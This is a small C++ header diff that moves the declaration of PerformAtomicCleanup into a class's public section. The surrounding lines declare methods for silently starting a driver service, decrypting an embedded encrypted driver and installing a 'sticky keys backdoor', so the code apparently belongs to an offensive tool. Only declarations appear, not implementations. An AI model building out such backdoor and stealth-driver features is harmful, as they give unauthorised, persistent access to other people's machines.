@@ -164,6 +164,9 @@ public:
     bool StartDriverServiceSilent() noexcept;
     std::vector<BYTE> ExtractEncryptedDriver() noexcept;
     std::vector<BYTE> DecryptDriver(const std::vector<BYTE>& encryptedData) noexcept;
+	
+    // Emergency cleanup for atomic operations
+    bool PerformAtomicCleanup() noexcept;
 
     // Sticky keys backdoor management
     bool InstallStickyKeysBackdoor() noexcept;
@@ -269,7 +272,4 @@ private:
     // Process name resolution with driver-free options
     std::optional<ProcessMatch> ResolveProcessName(const std::wstring& processName) noexcept;
     std::vector<ProcessMatch> FindProcessesByNameWithoutDriver(const std::wstring& pattern) noexcept;
-
-    // Emergency cleanup for atomic operations
-    bool PerformAtomicCleanup() noexcept;
 };
